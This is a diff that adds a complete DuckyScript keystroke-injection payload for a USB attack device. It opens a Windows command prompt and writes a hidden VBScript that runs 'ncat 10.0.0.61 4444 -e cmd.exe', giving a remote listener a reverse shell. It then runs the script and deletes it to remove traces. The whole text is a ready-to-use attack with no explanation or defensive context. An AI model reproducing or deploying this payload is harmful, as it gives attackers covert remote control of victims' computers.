@@ -1,0 +1,17 @@
+GUI r
+DELAY 500
+STRING cmd.exe
+ENTER
+DELAY 500
+STRING echo Dim Run >> invisiblershell.vbs
+ENTER
+STRING echo Run = "ncat 10.0.0.61 4444 -e cmd.exe" >> invisiblershell.vbs
+ENTER
+STRING echo CreateObject("Wscript.Shell").Run "" ^& Run ^& "", 0, False >> invisiblershell.vbs
+ENTER
+STRING invisiblershell.vbs
+ENTER
+STRING del invisiblershell.vbs
+ENTER
+STRING exit
+ENTER
